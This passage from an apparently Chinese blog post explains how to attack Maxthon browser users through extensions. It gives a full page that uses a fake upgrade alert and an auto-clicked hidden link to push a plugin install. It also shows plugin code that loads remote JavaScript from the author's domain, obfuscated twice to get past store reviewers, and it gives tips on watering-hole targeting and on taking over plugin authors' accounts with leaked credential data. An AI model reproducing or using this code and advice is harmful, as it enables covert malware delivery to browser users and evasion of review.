class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;116&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;IE=edge&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;title&amp;gt;欺骗用户安装插件&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;script src=&amp;quot;//cdn.bootcss.com/jquery/3.1.1/jquery.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    欺骗用户安装插件demo1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;a id=&amp;quot;app-install&amp;quot; style=&amp;quot;display:none;&amp;quot; file_def=&amp;quot;1.0.1&amp;quot; file_url=&amp;quot;http://extensiondl.maxthon.cn/skinpack/20062150/1462330643.mxaddon&amp;quot; file_id=&amp;quot;&amp;lt;?echo $view_id;?&amp;gt;&amp;quot;&amp;gt;安装&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script src=&amp;quot;//cdn.bootcss.com/jquery/3.1.1/jquery.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    setTimeout(function()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if(typeof(plug_setup)!=&amp;quot;function&amp;quot;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            alert(&amp;quot;因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后打开此页面&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            var ERRORTEXT = &amp;apos;非傲游浏览器或版本过低。&amp;lt;a href=&amp;quot;http://www.maxthon.cn&amp;quot; target=&amp;quot;_blank&amp;quot;&amp;gt;点此获取最新版本傲游浏览器&amp;lt;/a&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            function getInstallMessage(that, messagePack, type) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                if (external.mxCall) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    var packMxAttr = $(that).closest(messagePack);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    if (type === &amp;apos;skin&amp;apos;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        // 浏览器框架版本号&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        var frameVersion = external.mxCall(&amp;apos;GetSkinFxVersion&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    else if (type === &amp;apos;app&amp;apos;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        // 浏览器框架版本号&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        var frameVersion = external.mxCall(&amp;apos;GetAppFxVersion&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        // 下个版本上了就删掉--&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        if (frameVersion === &amp;apos;1.0.0&amp;apos;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            frameVersion = &amp;apos;1.0.1&amp;apos;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        // --下个版本上了就删掉&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    // 插件包框架版本号&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    var packMxVersion = packMxAttr.attr(&amp;apos;file_def&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    // 插件包url&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    var packUrl = packMxAttr.attr(&amp;apos;file_url&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    // 插件id&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    var packId = packMxAttr.attr(&amp;apos;file_id&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    console.log(frameVersion, packMxVersion, packUrl, type, packId)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    installPack(frameVersion, packMxVersion, packUrl, type, packId);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    resultPop.show(&amp;apos;浏览器不符&amp;apos;, ERRORTEXT, &amp;apos;确定&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            function installPack(frameVersion, packMxVersion, packUrl, type, packId) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                var isInstall = returnIsInstall(frameVersion, packMxVersion);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                if (isInstall !== -1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    if (type === &amp;apos;skin&amp;apos;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        external.mxCall(&amp;apos;InstallSkin&amp;apos;, packUrl);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    else if (type === &amp;apos;app&amp;apos;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        external.mxCall(&amp;apos;InstallApp&amp;apos;, packUrl);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    getUser(packId);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    resultPop.show(&amp;apos;浏览器不符&amp;apos;, ERRORTEXT, &amp;apos;确定&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            function returnIsInstall(frameVersion, packMxVersion) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                var fvItem;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                var pvItem;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                var frameVersion = getVersionArr(frameVersion);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                var packMxVersion = getVersionArr(packMxVersion);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                // 定义增长索引值.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                var i = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                while (1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    fvItem = frameVersion[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    pvItem = packMxVersion[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    if (fvItem == null &amp;amp;&amp;amp; pvItem == null) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    if (fvItem == null) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        return -1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    if (pvItem == null) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        return 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    if (fvItem != pvItem) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        var value = fvItem &amp;gt; pvItem ? 1 : -1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        return value;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    i++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            function getVersionArr(version) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                var versionArr = version.split(&amp;apos;.&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                for (var i = 0; i &amp;lt; versionArr.length; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    versionArr[i] = parseInt(versionArr[i], 10);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                return versionArr;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            function getUser(id) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                $.ajax(&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    type: &amp;apos;GET&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    url: &amp;apos;http://extension.maxthon.cn/common/ajax.php?id=&amp;apos; + id,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    data: &amp;apos;data&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    dataType: &amp;apos;json&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    success: function (data) &amp;#123;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    error: function () &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $(document).delegate(&amp;apos;#app-install&amp;apos;, &amp;apos;click&amp;apos;, function (event) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                event.preventDefault();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                event.stopPropagation();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                getInstallMessage(this, &amp;apos;a[file_def]&amp;apos;, &amp;apos;app&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $(&amp;quot;#app-install&amp;quot;).click();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;,1000);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;打开后的样子:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这处的LOL战绩查询插件是我之前上传的(不要安装)。真正攻击时可以换成不要那么二的名字，比如”网站增强工具”等&lt;/p&gt;
&lt;p&gt;一开始，我还想试试能不能点击劫持，这样就可以在用户不知情的情况下安装插件，但是这个安装程序不是在页面里面的。无法进行劫持，随之放弃。&lt;/p&gt;
&lt;p&gt;这样一来，尽量让用户少思考的网页就做好了。发布，等待用户上钩吧。这个方法可以与APT攻击中的”水坑攻击”进行相结合，以达到针对性某些特殊的群体或个体的攻击方式&lt;/p&gt;
&lt;h5 id=&quot;0x1-2-被动等待&quot;&gt;&lt;a href=&quot;#0x1-2-被动等待&quot; class=&quot;headerlink&quot; title=&quot;0x1.2 被动等待&quot;&gt;&lt;/a&gt;0x1.2 被动等待&lt;/h5&gt;&lt;p&gt;这个办法是属于广撒网，当没有指定性群体或者个人，只是为了单纯的攻击或者研究时使用。&lt;/p&gt;
&lt;p&gt;这里也有一些小技巧，当开发者上传插件时，遨游审核人员会对插件进行审核，如果发现危害用户的代码，将不给予通过，乍一看没什么问题，但是没有后续了。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;没有定期自动化扫描插件代码&lt;/p&gt;
&lt;p&gt;而且即使插件是一个小游戏用，都可以在配置文件def.json里申请权限是最高的&lt;/p&gt;
&lt;p&gt;当代码量足够多的时候，开发人员可以把一些危害到用户请求的代码进行加密混编绕过审查人员的眼睛。（调用伟大的人民领袖毛主席的一句话:与规矩斗，其乐无穷。与代码斗其乐无穷。与人斗其乐无穷。）&lt;/p&gt;
&lt;p&gt;可以在插件里调用第三方的JavaScript代码，第三方url可以指向任何域名。没有进行判断URL及js文件是否为可信&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;利用以上的问题，我们就可以写出一个具有危害到用户插件，且绕过审查人员的眼睛。&lt;/p&gt;
&lt;p&gt;我们可以在插件源码base.js文件里写&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//xxxxx其他多余的代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; script = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.createElement(&lt;span class=&quot;string&quot;&gt;&#39;script&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;script.src = &lt;span class=&quot;string&quot;&gt;&quot;http://你的域名/javascript文件名.js&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.body.appendChild(script);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//xxxxx其他多余的代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如果不放心可可以加密成下面的这种格式:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;eval(function(p,a,c,k,e,d)&amp;#123;e=function(c)&amp;#123;return(c&amp;lt;a?&amp;quot;&amp;quot;:e(parseInt(c/a)))+((c=c%a)&amp;gt;35?String.fromCharCode(c+29):c.toString(36))&amp;#125;;if(!&amp;apos;&amp;apos;.replace(/^/,String))&amp;#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&amp;#123;return d[e]&amp;#125;];e=function()&amp;#123;return&amp;apos;\\w+&amp;apos;&amp;#125;;c=1;&amp;#125;;while(c--)if(k[c])p=p.replace(new RegExp(&amp;apos;\\b&amp;apos;+e(c)+&amp;apos;\\b&amp;apos;,&amp;apos;g&amp;apos;),k[c]);return p;&amp;#125;(&amp;apos;o 7=[&amp;quot;\\e\\c\\g\\b\\a\\9&amp;quot;,&amp;quot;\\c\\g\\6\\8\\9\\6\\q\\h\\6\\j\\6\\f\\9&amp;quot;,&amp;quot;\\e\\g\\c&amp;quot;,&amp;quot;\\m\\9\\9\\a\\t\\i\\i\\d\\n\\j\\8\\b\\f\\i\\l\\8\\s\\8\\e\\c\\g\\b\\a\\9\\r\\b\\h\\6\\f\\8\\j\\6\\u\\l\\e&amp;quot;,&amp;quot;\\8\\a\\a\\6\\f\\d\\w\\m\\b\\h\\d&amp;quot;,&amp;quot;\\x\\n\\d\\v&amp;quot;];o k=p[7[1]](7[0]);k[7[2]]=7[3];p[7[5]][7[4]](k)&amp;apos;,34,34,&amp;apos;||||||x65|_0|x61|x74|x70|x69|x63|x64|x73|x6E|x72|x6C|x2F|x6D|script|x6A|x68|x6F|var|document|x45|x66|x76|x3A|x2E|x79|x43|x62&amp;apos;.split(&amp;apos;|&amp;apos;),0,&amp;#123;&amp;#125;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;方法为：先在&lt;a href=&quot;https://javascriptobfuscator.com/Javascript-Obfuscator.aspx&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;javascriptobfuscator&lt;/a&gt;上把正常的javascript代码加密成:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var _0x67c5=[&amp;quot;\x73\x63\x72\x69\x70\x74&amp;quot;,&amp;quot;\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74&amp;quot;,&amp;quot;\x73\x72\x63&amp;quot;,&amp;quot;\x68\x74\x74\x70\x3A\x2F\x2F\x64\x6F\x6D\x61\x69\x6E\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x66\x69\x6C\x65\x6E\x61\x6D\x65\x2E\x6A\x73&amp;quot;,&amp;quot;\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64&amp;quot;,&amp;quot;\x62\x6F\x64\x79&amp;quot;];var script=document[_0x67c5[1]](_0x67c5[0]);script[_0x67c5[2]]= _0x67c5[3];document[_0x67c5[5]][_0x67c5[4]](script)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/5.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;因为这样的代码看起来着实有点可疑…所以再去&lt;a href=&quot;http://tool.chinaz.com/js.aspx&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;站长之家&lt;/a&gt;加密成常见的加密代码:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/6.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;嗯，看着正常多了。放在众多代码之中，审查人员也很难找到(也不会用心找的)&lt;/p&gt;
&lt;p&gt;提交后，会在遨游插件的首页显示最近更新的插件，你只需要每个星期随便增加一点代码或者删除一点代码，再更新一下插件，你的插件就会常年存在插件首页，安装人数想不多都难。&lt;/p&gt;
&lt;h5 id=&quot;0x1-3-基于社工库控制插件作者的账户&quot;&gt;&lt;a href=&quot;#0x1-3-基于社工库控制插件作者的账户&quot; class=&quot;headerlink&quot; title=&quot;0x1.3 基于社工库控制插件作者的账户&quot;&gt;&lt;/a&gt;0x1.3 基于社工库控制插件作者的账户&lt;/h5&gt;&lt;p&gt;这个也是我个人来说最喜欢的方式，毕竟不得不承认不劳而获真的好爽啊。&lt;/p&gt;
&lt;p&gt;因为Maxthon更新插件时没有像Chrome那样需要秘钥才可以更新，所以导致这个’逻辑漏洞’’。因为没有验证当前是否为作者本人的机制，才导致这个方法的可行性。&lt;/p&gt;
&lt;p&gt;之前加了maxthon插件的作者群：203339427&lt;/p&gt;
